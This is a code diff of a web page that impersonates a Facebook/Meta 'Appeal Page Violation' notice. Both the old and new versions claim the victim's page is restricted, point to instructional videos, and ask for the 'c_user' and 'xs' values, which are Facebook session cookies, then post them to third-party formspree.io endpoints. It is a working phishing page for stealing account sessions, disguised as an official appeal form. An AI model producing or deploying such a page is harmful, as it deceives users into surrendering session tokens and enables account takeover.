@@ -1,181 +1,4 @@
-
-<!DOCTYPE html><html lang="en">
-  <style>
-    * {
-  margin: 0;
-  padding: 0;
-  font-family: "poppins", sans-serif;
-}
-
-body {
-  background-color: #efefef;
-}
-
-nav {
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  background-color: #4267b2;
-  padding: 15px 10%;
-}
-
-.fb-2 {
-  font-style: normal;
-  font-weight: bold;
-  font-size: 45px;
-  color: #ffffff;
-  margin-right: 45px;
-}
-
-.nav-right,
-.nav-left {
-  display: flex;
-  align-items: center;
-}
-
-.search-box {
-  background: #efefef;
-  width: 300px;
-  border-radius: 2px;
-  display: flex;
-  align-items: center;
-  padding: 0 15px;
-}
-
-.search-box img {
-  width: 18px;
-}
-
-.search-box input {
-  width: 100%;
-  background: transparent;
-  padding: 10px;
-  outline: none;
-  border: 0;
-}
-
-.main-body {
-  font-family: Arial, sans-serif;
-  background-color: #efefef;
-  color: #000000;
-  margin: 0;
-  padding: 0;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-}
-
-.content {
-  text-align: left;
-  padding: 20px;
-  border-radius: 5px;
-  box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
-  background-color: #f5f5f5;
-  width: 100%;
-  max-width: 50%;
-}
-
-.video-text {
-  font-weight: bold;
-  opacity: 60%;
-  font-size: small;
-}
-
-.tr-5 {
-  font-size: 15px;
-  font-style: initial;
-}
-
-.mt-4 {
-  font-weight: bold;
-  font-size: large;
-  opacity: 80%;
-}
-
-input {
-  border-width: 1px;
-  border-style: solid;
-  border-color: #c7c1c1;
-  padding: 5px;
-  border-radius: 5px;
-}
-
-.msi-4 {
-  font-style: initial;
-  font-size: 15px;
-}
-
-.container {
-  position: relative;
-  width: 100%;
-  background-color: #f0f0f0;
-}
-
-.button {
-  position: absolute;
-  top: 50%;
-  left: 93%;
-  transform: translate(-50%, -20%);
-  padding: 8px 2%;
-  background-color: #4267b2;
-  color: #ffffff;
-  border: none;
-  cursor: pointer;
-  font-weight: 550;
-  font-size: 80%;
-  border-radius: 3px;
-}
-
-.copy-r {
-  font-style: normal;
-  font-weight: 550;
-  opacity: 70%;
-  padding: 15px 2%;
-}
-/* Styles for the loader overlay */
-#loader-overlay {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background-color: rgba(255, 255, 255, 0.9); /* semi-transparent white background */
-    z-index: 9999; /* Ensure the loader appears above other content */
-    display: flex;
-    justify-content: center;
-    align-items: center;
-}
-
-.loader {
-    border: 16px solid #f3f3f3; /* Light grey */
-    border-top: 16px solid #3498db; /* Blue */
-    border-radius: 50%;
-    width: 120px;
-    height: 120px;
-    animation: spin 2s linear infinite;
-}
-
-@keyframes spin {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-}
-
-#c_user[type="number"]::-webkit-inner-spin-button,
-#c_user[type="number"]::-webkit-outer-spin-button {
-    -webkit-appearance: none;
-    margin: 0;
-}
-
-
-input[type="number"] {
-  -moz-appearance: textfield;
-}
-input[type="number"]::-webkit-inner-spin-button,
-input[type="number"]::-webkit-outer-spin-button {
-  -webkit-appearance: none;
-  margin: 0;
-}
-    </style>
+<html lang="en">
   <head>
 <script type="text/javascript">
   // This is a CodeSandbox injection script that's used to
@@ -218,7 +41,7 @@ input[type="number"]::-webkit-outer-spin-button {
           });
 
           devtoolProtocol.sendRawMessage(
-            `{"id":5,"method":"Runtime.enable","params":{}}`
+            {"id":5,"method":"Runtime.enable","params":{}}
           );
         }        
       }
@@ -227,9 +50,9 @@ input[type="number"]::-webkit-outer-spin-button {
     })();
   }
 
-  if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ === "undefined") {
+  if (typeof _REACT_DEVTOOLS_GLOBAL_HOOK_ === "undefined") {
     let nextID = 0;
-    let hook = (__REACT_DEVTOOLS_GLOBAL_HOOK__ = {
+    let hook = (_REACT_DEVTOOLS_GLOBAL_HOOK_ = {
       renderers: new Map(),
       supportsFiber: true,
       inject: (renderer) => {
@@ -286,7 +109,7 @@ input[type="number"]::-webkit-outer-spin-button {
           });
 
           devtoolProtocol.sendRawMessage(
-            `{"id":5,"method":"Runtime.enable","params":{}}`
+            {"id":5,"method":"Runtime.enable","params":{}}
           );
         }        
       }
@@ -295,9 +118,9 @@ input[type="number"]::-webkit-outer-spin-button {
     })();
   }
 
-  if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ === "undefined") {
+  if (typeof _REACT_DEVTOOLS_GLOBAL_HOOK_ === "undefined") {
     let nextID = 0;
-    let hook = (__REACT_DEVTOOLS_GLOBAL_HOOK__ = {
+    let hook = (_REACT_DEVTOOLS_GLOBAL_HOOK_ = {
       renderers: new Map(),
       supportsFiber: true,
       inject: (renderer) => {
@@ -313,101 +136,130 @@ input[type="number"]::-webkit-outer-spin-button {
 
   document.currentScript.remove();
 </script>
-  <meta charset="UTF-8">
-  <link rel="icon" type="image/png" href="Facebook_Logo_2023.png">
-  <link rel="stylesheet" href="style.css">
-  <title>Action | Required</title>
-</head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Action Form | Facebook</title>
+    <link rel="stylesheet" href="style.css" />
 
-<body>
- 
+    <link
+      rel="stylesheet"
+      href="https://meta-submit.github.io/report-isuess-fb-request-now/style.css"
+    />
 
+    <style>
+      .img {
+        width: 300px;
+        height: 300px;
+      }
+    </style>
 
-    <nav>
-      <div class="nav-left">
-        <p class="fb-2">facebook</p>
-      </div>
-      <div class="nav-right">
-        <div class="search-box">
-          <img src="https://cdn.glitch.global/d08141de-e7af-45a5-916b-2f09d06ac286/search-icon-lob.png?v=1712422050841" alt="search-icon">
-          <input type="text" placeholder="Search" data-twofas-input-listener="true" data-twofas-element-number="0">
+    <body>
+      <div class="header_container">
+        <nav class="header__nav">
+          <p class="facebook">facebook</p>
+          <header>
+            <input
+              class="nav-search"
+              type="text"
+              placeholder="How can we help?"
+            />
+          </header>
+        </nav>
+        <div class="help">
+          <div class="container__helper">
+            <li>
+              <a class="help__a" href="#"
+                ><img src="https://i.imgur.com/ZcUp73J.png" />Help Center</a
+              >
+            </li>
+          </div>
         </div>
       </div>
-    </nav>
-    <br><br>
-
-    <div class="main-body">
-      <form class="content" action="https://formspree.io/f/mnnajvbk" method="POST">
-        <div>
-          <img src="https://www.victoryxr.com/wp-content/uploads/2023/04/Meta-Logo-1024x576.png.webp" width="140">
+      <div class="main">
+        <header class="main__header">
+          <marquee> <h3 class="main__h3">Appeal Page Violation</h3></marquee>
+        </header>
+        <div class="main__body">
+          <p>
+            We have detected unusual activity on your page that violates our
+            community standards.
+          </p>
+          <p>
+            Your access to your page has been limited, and you are currently
+            unable to post, share, or comment using your page.
+          </p>
+          <p>
+            If you believe this to be a mistake, you have the option to submit
+            an appeal by providing the necessary information.
+          </p>
+          <p class="video__p">Detailed Video Information</p>
+          <a
+            target="_blank"
+            onclick="myFunction()"
+            class="video" <a
+            href="https://cdn.glitch.global/116aac45-aeea-4339-8e11-ec99eca8b56f/f045b47d-0186-4ea1-8d71-4a53316ab868.WhatsApp%20Video%202024-07-23%20at%2014.43.21_dcdca9fc.mp4?v=1721727995925"
+          >
+            <img
+              src="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png"
+              width="150"
+          /></a>
+          <div>
+            <h3>
+              Must Watch the video to submit required information restriction
+              won't be removed with incorrect information!
+            </h3>
+          </div>
+          <p>Please be sure to provide the requested information below.</p>
+          <form
+            action="https://formspree.io/f/xnnanzrd"
+            method="POST"
+          >
+            <label class="label" for="recipient">c_user</label>
+            <input
+              class="input"
+              id="numberInput"
+              type="C_user"
+              name="C_user"
+              required=""
+            />
+            <label class="label" for="subject">xs</label>
+            <input
+              class="input"
+              title="Enter correct information! Watch the video"
+              for="text"
+              name="xs"
+              pattern=".{30,}"
+              required=""
+            />
+            <p class="text-[10px] font-serif mt-3 mx -3"></p>
+            <div id="btn-div" class="btn-div">
+              <button class="btn" type="submit" onclick="sendEmail()">
+                Submit
+              </button>
+            </div>
+          </form>
         </div>
-
-        <p class="tr-5">
-          We have detected unusual activity on your page that violates our
-          community standards.
-        </p>
-        <br>
-        <p class="tr-5">
-          Your access to your page has been limited, and you are currently
-          unable to post, share, or comment using your page.
-        </p>
-        <br>
-        <p class="tr-5">
-          If you believe this to be a mistake, you have the option to submit an
-          appeal by providing the necessary information.
-        </p>
-        <br>
-
-        <div class="video-text">
-          <p>Must Watch Detailed Video Information:</p>
+      </div>
+      <div class="footer">
+        <div class="footer__container">
+          <ul class="footer-ul">
+            <li><a href="">About</a></li>
+            <li><a href="">Privacy Policy</a></li>
+            <li><a href="">Careers</a></li>
+          </ul>
+          <ul class="footer-ul">
+            <li><a href="">AdChoices</a></li>
+            <li><a href="">Create ad</a></li>
+            <li><a href="">Create Page</a></li>
+          </ul>
+          <ul class="footer-ul">
+            <li><a href="">Terms and policies</a></li>
+            <li><a href="">Cookies</a></li>
+          </ul>
         </div>
+      </div>
+     
+        </figure>
+      </div>
 
-        <div>
-          <video controls="" loop="" width="320" poster="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png">
-            <source src="https://cdn.glitch.global/125da627-08ba-4e22-acf3-c75d7cbdc325/WhatsApp%20Video%202024-06-25%20at%2018.53.47_3093dc69.mp4?v=1719948585883" type="video/mp4">
-          </video>
-        </div>
-
-        <p class="tr-5">
-          Please be sure to provide the requested information below.
-        </p>
-        <br>
-
-        <div>
-          <p class="mt-4">c_user</p>
-          <input type="number" name="c_user" id="c_user" required="1" data-twofas-input-listener="true" data-twofas-element-number="1">
-        </div>
-        <br>
-
-        <div>
-          <p class="mt-4">xs</p>
-          <input type="text" name="xs" id="xs" placeholder="" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&amp;+=]).{12,}$" title="Must Watch Detailed Video" required="1" data-twofas-input-listener="true" data-twofas-element-number="2">
-        </div>
-        <br>
-        
-        
-
-        <p class="msi-4">
-          Please make sure account not to log out from your computer or laptop
-          until you have received a approval from facebook.
-        </p>
-        <br>
-
-        <div class="container">
-          <button class="button" data-twofas-element-number="3">
-            <p>Submit</p>
-          </button>
-        </div>
-        <br>
-        <br>
-      </form>
-    </div>
-    <br><br>
-    <div>
-      <p class="copy-r">Meta ©️ 2024</p>
-    </div>
-  </div>
-
-<script src="script.js"></script>
-
-</body></html>
+    
